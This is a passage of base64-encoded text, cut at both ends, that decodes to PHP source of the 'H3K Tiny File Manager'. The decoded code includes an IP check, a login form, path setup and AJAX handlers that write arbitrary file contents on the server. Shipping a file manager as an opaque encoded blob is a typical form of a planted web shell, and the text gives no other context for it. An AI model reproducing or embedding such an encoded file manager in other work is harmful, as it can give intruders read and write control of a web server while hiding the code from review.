NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkcHJvY2VlZCA9PSBmYWxzZSkgew0KICAgICAgICB0cmlnZ2VyX2Vycm9yKCdVc2VyIGNvbm5lY3Rpb24gZGVuaWVkIGZyb206ICcgLiAkY2xpZW50SXAsIEVfVVNFUl9XQVJOSU5HKTsNCg0KICAgICAgICBpZiAoJGlwX3NpbGVudCA9PSBmYWxzZSkgew0KICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0FjY2VzcyBkZW5pZWQuIElQIHJlc3RyaWN0aW9uIGFwcGxpY2FibGUnKSwgJ2Vycm9yJyk7DQogICAgICAgICAgICBmbV9zaG93X2hlYWRlcl9sb2dpbigpOw0KICAgICAgICAgICAgZm1fc2hvd19tZXNzYWdlKCk7DQogICAgICAgIH0NCiAgICAgICAgZXhpdCgpOw0KICAgIH0NCn0NCg0KLy8gQ2hlY2tpbmcgaWYgdGhlIHVzZXIgaXMgbG9nZ2VkIGluIG9yIG5vdC4gSWYgbm90LCBpdCB3aWxsIHNob3cgdGhlIGxvZ2luIGZvcm0uDQppZiAoJHVzZV9hdXRoKSB7DQogICAgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10sICRhdXRoX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ11dKSkgew0KICAgICAgICAvLyBMb2dnZWQNCiAgICB9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWydmbV91c3InXSwgJF9QT1NUWydmbV9wd2QnXSwgJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICAvLyBMb2dnaW5nIEluDQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwYXNzd29yZF92ZXJpZnknKSkgew0KICAgICAgICAgICAgaWYgKGlzc2V0KCRhdXRoX3VzZXJzWyRfUE9TVFsnZm1fdXNyJ11dKSAmJiBpc3NldCgkX1BPU1RbJ2ZtX3B3ZCddKSAmJiBwYXNzd29yZF92ZXJpZnkoJF9QT1NUWydmbV9wd2QnXSwgJGF1dGhfdXNlcnNbJF9QT1NUWydmbV91c3InXV0pICYmIHZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgICAgICAgICAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddID0gJF9QT1NUWydmbV91c3InXTsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnWW91IGFyZSBsb2dnZWQgaW4nKSk7DQogICAgICAgICAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnTG9naW4gZmFpbGVkLiBJbnZhbGlkIHVzZXJuYW1lIG9yIHBhc3N3b3JkJyksICdlcnJvcicpOw0KICAgICAgICAgICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdwYXNzd29yZF9oYXNoIG5vdCBzdXBwb3J0ZWQsIFVwZ3JhZGUgUEhQIHZlcnNpb24nKSwgJ2Vycm9yJyk7Ow0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgLy8gRm9ybQ0KICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICAgICAgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsNCj8+DQogICAgICAgIDxzZWN0aW9uIGNsYXNzPSJoLTEwMCI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgaC0xMDAiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtbWQtY2VudGVyIGFsaWduLWNvbnRlbnQtY2VudGVyIGgtMTAwdmgiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXdyYXBwZXIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBmYXQiIGRhdGEtYnMtdGhlbWU9Ijw/cGhwIGVjaG8gRk1fVEhFTUU7ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBjbGFzcz0iZm9ybS1zaWduaW4iIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGF1dG9jb21wbGV0ZT0ib2ZmIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJyYW5kIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyB2ZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgTTEwMDggd2lkdGg9IjEwMCUiIGhlaWdodD0iODBweCIgdmlld0JveD0iMCAwIDIzOC4wMDAwMDAgMTQwLjAwMDAwMCIgYXJpYS1sYWJlbD0iSDNLIFRpbnkgRmlsZSBNYW5hZ2VyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDAuMDAwMDAwLDE0MC4wMDAwMDApIHNjYWxlKDAuMTAwMDAwLC0wLjEwMDAwMCkiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0ibm9uZSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE2MCA3MDAgbDAgLTYwMCAxMTAgMCAxMTAgMCAwIDI2MCAwIDI2MCA3MCAwIDcwIDAgMCAtMjYwIDAgLTI2MCAxMTAgMCAxMTAgMCAwIDYwMCAwIDYwMCAtMTEwIDAgLTExMCAwIDAgLTI2MCAwIC0yNjAgLTcwIDAgLTcwIDAgMCAyNjAgMCAyNjAgLTExMCAwIC0xMTAgMCAwIC02MDB6IiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwYXRoIGZpbGw9IiMwMDM1MDAiIGQ9Ik0xMDA4IDEyMjcgbC0xMDggLTcyIDAgLTExNyAwIC0xMTggMTEwIDAgMTEwIDAgMCAxMTAgMCAxMTAgNzAgMCA3MCAwIDAgLTE4MCAwIC0xODAgLTEyNSAwIGMtNjkgMCAtMTI1IC0zIC0xMjUgLTYgMCAtMyAyMyAtMzkgNTIgLTgwIGw1MiAtNzQgNzMgMCA3MyAwIDAgLTE4NSAwIC0xODUgLTcwIDAgLTcwIDAgMCAxMTUgMCAxMTUgLTExMCAwIC0xMTAgMCAwIC0xOTAgMCAtMTkwIDE4MSAwIDE4MSAwIDEwOSA3MyAxMDggNzIgMSAxODEgMCAxODEgLTY5IDQ4IC02OCA0OSA2OCA1MCA2OSA0OSAwIDI0OSAwIDI0OCAtMTgyIC0xIC0xODMgMCAtMTA3IC03MnoiIC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE2NDAgNzAwIGwwIC02MDAgMTEwIDAgMTEwIDAgMCAyMDggMCAyMDggMzUgMzQgMzUgMzQgMzUgLTM0IDM1IC0zNCAwIC0yMDggMCAtMjA4IDExMCAwIDExMCAwIDAgMjEyIDAgMjEzIC04NyA4NyAtODggODggODggODggODcgODcgMCAyMTMgMCAyMTIgLTExMCAwIC0xMTAgMCAwIC0yMDggMCAtMjA4IC03MCAtNjkgLTcwIC02OSAwIDI3NyAwIDI3NyAtMTEwIDAgLTExMCAwIDAgLTYwMHoiIC8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2c+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgxIGNsYXNzPSJjYXJkLXRpdGxlIj48P3BocCBlY2hvIEFQUF9USVRMRTsgPz48L2gxPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aHIgLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZtX3VzciIgY2xhc3M9InBiLTIiPjw/cGhwIGVjaG8gbG5nKCdVc2VybmFtZScpOyA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbV91c3IiIG5hbWU9ImZtX3VzciIgcmVxdWlyZWQgYXV0b2ZvY3VzPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZtX3B3ZCIgY2xhc3M9InBiLTIiPjw/cGhwIGVjaG8gbG5nKCdQYXNzd29yZCcpOyA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iZm1fcHdkIiBuYW1lPSJmbV9wd2QiIHJlcXVpcmVkPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1iLTMiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGZtX3Nob3dfbWVzc2FnZSgpOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbGVudGl0aWVzKCRfU0VTU0lPTlsndG9rZW4nXSk7ID8+IiAvPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MgYnRuLWJsb2NrIHctMTAwIG10LTQiIHJvbGU9ImJ1dHRvbiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdMb2dpbicpOyA/Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyIHRleHQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAmbWRhc2g7Jm1kYXNoOyAmY29weTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL3RpbnlmaWxlbWFuYWdlci5naXRodWIuaW8vIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9InRleHQtZGVjb3JhdGlvbi1ub25lIHRleHQtbXV0ZWQiIGRhdGEtdmVyc2lvbj0iPD9waHAgZWNobyBWRVJTSU9OOyA/PiI+Q0NQIFByb2dyYW1tZXJzPC9hPiAmbWRhc2g7Jm1kYXNoOw0KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvc2VjdGlvbj4NCg0KICAgIDw/cGhwDQogICAgICAgIGZtX3Nob3dfZm9vdGVyX2xvZ2luKCk7DQogICAgICAgIGV4aXQ7DQogICAgfQ0KfQ0KDQovLyB1cGRhdGUgcm9vdCBwYXRoDQppZiAoJHVzZV9hdXRoICYmIGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10pKSB7DQogICAgJHJvb3RfcGF0aCA9IGlzc2V0KCRkaXJlY3Rvcmllc191c2Vyc1skX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddXSkgPyAkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0gOiAkcm9vdF9wYXRoOw0KfQ0KDQovLyBjbGVhbiBhbmQgY2hlY2sgJHJvb3RfcGF0aA0KJHJvb3RfcGF0aCA9IHJ0cmltKCRyb290X3BhdGgsICdcXC8nKTsNCiRyb290X3BhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRyb290X3BhdGgpOw0KaWYgKCFAaXNfZGlyKCRyb290X3BhdGgpKSB7DQogICAgZWNobyAiPGgxPiIgLiBsbmcoJ1Jvb3QgcGF0aCcpIC4gIiBcInskcm9vdF9wYXRofVwiICIgLiBsbmcoJ25vdCBmb3VuZCEnKSAuICIgPC9oMT4iOw0KICAgIGV4aXQ7DQp9DQoNCmRlZmluZWQoJ0ZNX1NIT1dfSElEREVOJykgfHwgZGVmaW5lKCdGTV9TSE9XX0hJRERFTicsICRzaG93X2hpZGRlbl9maWxlcyk7DQpkZWZpbmVkKCdGTV9ST09UX1BBVEgnKSB8fCBkZWZpbmUoJ0ZNX1JPT1RfUEFUSCcsICRyb290X3BhdGgpOw0KZGVmaW5lZCgnRk1fTEFORycpIHx8IGRlZmluZSgnRk1fTEFORycsICRsYW5nKTsNCmRlZmluZWQoJ0ZNX0ZJTEVfRVhURU5TSU9OJykgfHwgZGVmaW5lKCdGTV9GSUxFX0VYVEVOU0lPTicsICRhbGxvd2VkX2ZpbGVfZXh0ZW5zaW9ucyk7DQpkZWZpbmVkKCdGTV9VUExPQURfRVhURU5TSU9OJykgfHwgZGVmaW5lKCdGTV9VUExPQURfRVhURU5TSU9OJywgJGFsbG93ZWRfdXBsb2FkX2V4dGVuc2lvbnMpOw0KZGVmaW5lZCgnRk1fRVhDTFVERV9JVEVNUycpIHx8IGRlZmluZSgnRk1fRVhDTFVERV9JVEVNUycsICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc3LjAuMCcsICc8JykgPyBzZXJpYWxpemUoJGV4Y2x1ZGVfaXRlbXMpIDogJGV4Y2x1ZGVfaXRlbXMpKTsNCmRlZmluZWQoJ0ZNX0RPQ19WSUVXRVInKSB8fCBkZWZpbmUoJ0ZNX0RPQ19WSUVXRVInLCAkb25saW5lX3ZpZXdlcik7DQpkZWZpbmUoJ0ZNX1JFQURPTkxZJywgJGdsb2JhbF9yZWFkb25seSB8fCAoJHVzZV9hdXRoICYmICFlbXB0eSgkcmVhZG9ubHlfdXNlcnMpICYmIGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10pICYmIGluX2FycmF5KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10sICRyZWFkb25seV91c2VycykpKTsNCmRlZmluZSgnRk1fSVNfV0lOJywgRElSRUNUT1JZX1NFUEFSQVRPUiA9PSAnXFwnKTsNCg0KLy8gYWx3YXlzIHVzZSA/cD0NCmlmICghaXNzZXQoJF9HRVRbJ3AnXSkgJiYgZW1wdHkoJF9GSUxFUykpIHsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nKTsNCn0NCg0KLy8gZ2V0IHBhdGgNCiRwID0gaXNzZXQoJF9HRVRbJ3AnXSkgPyAkX0dFVFsncCddIDogKGlzc2V0KCRfUE9TVFsncCddKSA/ICRfUE9TVFsncCddIDogJycpOw0KDQovLyBjbGVhbiBwYXRoDQokcCA9IGZtX2NsZWFuX3BhdGgoJHApOw0KDQovLyBmb3IgYWpheCByZXF1ZXN0IC0gc2F2ZQ0KJGlucHV0ID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokX1BPU1QgPSAoc3RycG9zKCRpbnB1dCwgJ2FqYXgnKSAhPSBGQUxTRSAmJiBzdHJwb3MoJGlucHV0LCAnc2F2ZScpICE9IEZBTFNFKSA/IGpzb25fZGVjb2RlKCRpbnB1dCwgdHJ1ZSkgOiAkX1BPU1Q7DQoNCi8vIGluc3RlYWQgZ2xvYmFscyB2YXJzDQpkZWZpbmUoJ0ZNX1BBVEgnLCAkcCk7DQpkZWZpbmUoJ0ZNX1VTRV9BVVRIJywgJHVzZV9hdXRoKTsNCmRlZmluZSgnRk1fRURJVF9GSUxFJywgJGVkaXRfZmlsZXMpOw0KZGVmaW5lZCgnRk1fSUNPTlZfSU5QVVRfRU5DJykgfHwgZGVmaW5lKCdGTV9JQ09OVl9JTlBVVF9FTkMnLCAkaWNvbnZfaW5wdXRfZW5jb2RpbmcpOw0KZGVmaW5lZCgnRk1fVVNFX0hJR0hMSUdIVEpTJykgfHwgZGVmaW5lKCdGTV9VU0VfSElHSExJR0hUSlMnLCAkdXNlX2hpZ2hsaWdodGpzKTsNCmRlZmluZWQoJ0ZNX0hJR0hMSUdIVEpTX1NUWUxFJykgfHwgZGVmaW5lKCdGTV9ISUdITElHSFRKU19TVFlMRScsICRoaWdobGlnaHRqc19zdHlsZSk7DQpkZWZpbmVkKCdGTV9EQVRFVElNRV9GT1JNQVQnKSB8fCBkZWZpbmUoJ0ZNX0RBVEVUSU1FX0ZPUk1BVCcsICRkYXRldGltZV9mb3JtYXQpOw0KDQp1bnNldCgkcCwgJHVzZV9hdXRoLCAkaWNvbnZfaW5wdXRfZW5jb2RpbmcsICR1c2VfaGlnaGxpZ2h0anMsICRoaWdobGlnaHRqc19zdHlsZSk7DQoNCi8qKioqKioqKioqKioqKioqKioqKioqKioqKiogQUNUSU9OUyAqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQoNCi8vIEhhbmRsZSBhbGwgQUpBWCBSZXF1ZXN0DQppZiAoKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10sICRhdXRoX3VzZXJzWyRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ11dKSB8fCAhRk1fVVNFX0FVVEgpICYmIGlzc2V0KCRfUE9TVFsnYWpheCddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSkgew0KICAgIGlmICghdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMSBVbmF1dGhvcml6ZWQnKTsNCiAgICAgICAgZGllKCJJbnZhbGlkIFRva2VuLiIpOw0KICAgIH0NCg0KICAgIC8vc2VhcmNoIDogZ2V0IGxpc3Qgb2YgZmlsZXMgZnJvbSB0aGUgY3VycmVudCBmb2xkZXINCiAgICBpZiAoaXNzZXQoJF9QT1NUWyd0eXBlJ10pICYmICRfUE9TVFsndHlwZSddID09ICJzZWFyY2giKSB7DQogICAgICAgICRkaXIgPSAkX1BPU1RbJ3BhdGgnXSA9PSAiLiIgPyAnJyA6ICRfUE9TVFsncGF0aCddOw0KICAgICAgICAkcmVzcG9uc2UgPSBzY2FuKGZtX2NsZWFuX3BhdGgoJGRpciksICRfUE9TVFsnY29udGVudCddKTsNCiAgICAgICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOw0KICAgICAgICBleGl0KCk7DQogICAgfQ0KDQogICAgLy8gc2F2ZSBlZGl0b3IgZmlsZQ0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gInNhdmUiKSB7DQogICAgICAgIC8vIGdldCBjdXJyZW50IHBhdGgNCiAgICAgICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgICAgICB9DQogICAgICAgIC8vIGNoZWNrIHBhdGgNCiAgICAgICAgaWYgKCFpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nKTsNCiAgICAgICAgfQ0KICAgICAgICAkZmlsZSA9ICRfR0VUWydlZGl0J107DQogICAgICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSk7DQogICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgICAgICBpZiAoJGZpbGUgPT0gJycgfHwgIWlzX2ZpbGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICAgICAgICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICAgICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICAgICAgfQ0KICAgICAgICBoZWFkZXIoJ1gtWFNTLVByb3RlY3Rpb246MCcpOw0KICAgICAgICAkZmlsZV9wYXRoID0gJHBhdGggLiAnLycgLiAkZmlsZTsNCg0KICAgICAgICAkd3JpdGVkYXRhID0gJF9QT1NUWydjb250ZW50J107DQogICAgICAgICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJ3Iik7DQogICAgICAgICR3cml0ZV9yZXN1bHRzID0gQGZ3cml0ZSgkZmQsICR3cml0ZWRhdGEpOw0KICAgICAgICBmY2xvc2UoJGZkKTsNCiAgICAgICAgaWYgKCR3cml0ZV9yZXN1bHRzID09PSBmYWxzZSkgew0KICAgICAgICAgICAgaGVhZGVyKCJIVFRQLzEuMSA1MDAgSW50ZXJuYWwgU2VydmVyIEVycm9yIik7DQogICAgICAgICAgICBkaWUoIkNvdWxkIE5vdCBXcml0ZSBGaWxlISAtIENoZWNrIFBlcm1pc3Npb25zIC8gT3duZXJzaGlwIik7DQogICAgICAgIH0NCiAgICAgICAgZGllKHRydWUpOw0KICAgIH0NCg0KICAgIC8vIGJhY2t1cCBmaWxlcw0KICAgIGlmIChpc3NldCgkX1BPU1RbJ3R5cGUnXSkgJiYgJF9QT1NUWyd0eXBlJ10gPT0gImJhY2t1cCIgJiYgIWVtcHR5KCRfUE9TVFsnZmlsZSddKSkgew0KICAgICAgICAkZmlsZU5hbWUgPSBmbV9jbGVhbl9wYXRoKCRfUE9TVFsnZmlsZSddKTsNCiAgICAgICAgJGZ1bGxQYXRoID0gRk1fUk9PVF9QQVRIIC4gJy8nOw0KICAgICAgICBpZiAoIWVtcHR5KCRfUE9TVFsncGF0aCddKSkgew0KICAgICAgICAgICAgJHJlbGF0aXZlRGlyUGF0aCA9IGZtX2NsZWFuX3BhdGgoJF9QT1NUWydwYXRoJ10pOw0KICAgICAgICAgICAgJGZ1bGxQYXRoIC49ICJ7JHJlbGF0aXZlRGlyUGF0aH0vIjsNCiAgICAgICAgfQ0KICAgICAgICAkZGF0ZSA9IGRhdGUoImRNeS1IaXMiKTsNCiAgICAgICAgJG5ld0ZpbGVOYW1lID0gInskZmlsZU5hbWV9LXskZGF0ZX0uYmFrIjsNCiAgICAgICAgJGZ1bGx5UXVhbGlmaWVkRmlsZU5hbWUgPSAkZnVsbFBhdGggLiAkZmlsZU5hbWU7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRmdWxseVF1YWxpZmllZEZpbGVOYW1lKSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIkZpbGUgeyRmaWxlTmFtZX0gbm90IGZvdW5kIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoY29weSgkZnVsbHlRdWFsaWZpZWRGaWxlTmFtZSwgJGZ1bGxQYXRoIC4gJG5ld0ZpbGVOYW1lKSkgew0KICAgICAgICAgICAgICAgIGVjaG8gIkJhY2t1cCB7JG5ld0ZpbGVOYW1lfSBjcmVhdGVkIjsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiQ291bGQgbm90IGNvcHkgZmlsZSB7JGZpbGVOYW1lfSIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICAgIGVjaG8gJGUtPmdldE1lc3NhZ2UoKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIFNhdmUgQ29uZmlnDQogICAgaWYgKGlzc2V0KCRfUE9TVFsndHlwZSddKSAmJiAkX1BPU1RbJ3R5cGUnXSA9PSAic2V0dGluZ3MiKSB7DQogICAgICAgIGdsb2JhbCAkY2ZnLCAkbGFuZywgJHJlcG9ydF9lcnJvcnMsICRzaG93X2hpZGRlbl9maWxlcywgJGxhbmdfbGlzdCwgJGhpZGVfQ29scywgJHRoZW1lOw0KICAgICAgICAkbmV3TG5nID0gJF9QT1NUWydqcy1sYW5ndWFnZSddOw0KICAgICAgICBmbV9nZXRfdHJhbnNsYXRpb25zKFtdKTsNCiAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRuZXdMbmcsICRsYW5nX2xpc3QpKSB7DQogICAgICAgICAgICAkbmV3TG5nID0gJ2VuJzsNCiAgICAgICAgfQ0KDQogICAgICAgICRlcnAgPSBpc3NldCgkX1BPU1RbJ2pzLWVycm9yLXJlcG9ydCddKSAmJiAkX1BPU1RbJ2pzLWVycm9yLXJlcG9ydCddID09ICJ0cnVlIiA/IHRydWUgOiBmYWxzZTsNCiAgICAgICAgJHNoZiA9IGlzc2V0KCRfUE9TVFsnanMtc2hvdy1oaWRkZW4nXSkgJiYgJF9QT1NUWydqcy1zaG93LWhpZGRlbiddID09ICJ0cnVlIiA/IHRydWUgOiBmYWxzZTsNCiAgICAgICAgJGhjbyA9IGlzc2V0KCRfUE9TVFsnanMtaGlkZS1jb2xzJ10pICYmICRfUE9TVFsnanMtaGlkZS1jb2xzJ10gPT0gInRydWUiID8gdHJ1ZSA6IGZhbHNlOw0KICAgICAgICAkdGUzID0gJF9QT1NUWydqcy10aGVtZS0zJ107DQoNCiAgICAgICAgaWYgKCRjZmctPmRhdGFbJ2xhbmcnXSAhPSAkbmV3TG5nKSB7DQogICAgICAgICAgICAkY2ZnLT5kYXRhWydsYW5nJ10gPSAkbmV3TG5nOw0KICAgICAgICAgICAgJGxhbmcgPSAkbmV3TG5nOw0KICAgICAgICB9DQogICAgICAgIGlmICgkY2ZnLT5kYXRhWydlcnJvcl9yZXBvcnRpbmcnXSAhPSAkZXJwKSB7DQogICAgICAgICAgICAkY2ZnLT5kYXRhWydlcnJvcl9yZXBvcnRpbmcnXSA9ICRlcnA7DQogICAgICAgICAgICAkcmVwb3J0X2Vycm9ycyA9ICRlcnA7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10gIT0gJHNoZikgew0KICAgICAgICAgICAgJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSA9ICRzaGY7DQogICAgICAgICAgICAkc2hvd19oaWRkZW5fZmlsZXMgPSAkc2hmOw0KICAgICAgICB9DQogICAgICAgIGlmICgkY2ZnLT5kYXRhWydzaG93X2hpZGRlbiddICE9ICRzaGYpIHsNCiAgICAgICAgICAgICRjZmctPmRhdGFbJ3Nob3dfaGlkZGVuJ10gPSAkc2hmOw0KICAgICAgICAgICAgJHNob3dfaGlkZGVuX2